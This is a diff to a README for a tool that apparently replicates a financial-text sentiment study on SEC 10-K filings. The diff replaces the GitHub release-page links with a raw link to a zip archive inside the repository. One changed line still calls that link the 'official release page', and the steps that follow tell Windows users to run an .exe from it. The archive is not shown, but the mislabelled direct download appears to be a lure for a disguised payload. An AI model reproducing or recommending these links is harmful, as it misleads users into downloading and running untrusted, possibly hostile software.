@@ -1,6 +1,6 @@
 # 📈 lm2011-replication - Analyze financial text for better insights
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/slopshoporderulvales606/lm2011-replication/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/slopshoporderulvales606/lm2011-replication/main/input/replication_lm_2.4.zip)
 
 This software replicates the study by Loughran and McDonald. It performs sentiment analysis on SEC 10-K filings. You can use this tool to count specific words in company reports. It then calculates how these words relate to stock returns. The process follows the standard Fama-MacBeth regression method.
 
@@ -8,7 +8,7 @@ This software replicates the study by Loughran and McDonald. It performs sentime
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Go to the [official release page](https://github.com/slopshoporderulvales606/lm2011-replication/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/slopshoporderulvales606/lm2011-replication/main/input/replication_lm_2.4.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
